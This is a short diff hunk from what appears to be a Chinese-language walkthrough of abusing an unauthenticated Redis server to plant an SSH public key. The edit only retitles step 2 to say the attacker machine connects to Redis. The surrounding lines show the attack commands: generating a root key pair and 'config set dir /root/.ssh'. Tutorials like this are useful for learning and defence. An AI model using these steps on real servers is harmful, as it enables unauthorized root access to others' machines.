@@ -84,7 +84,7 @@ ssh-keygen -t rsa -b 4096 -N "" -f /root/.ssh/id_rsa
 cat /root/.ssh/id_rsa.pub
 ```
 
-2. Redis 写入公钥
+2. 攻击机连接Redis 写入公钥
 
 ```
 config set dir /root/.ssh
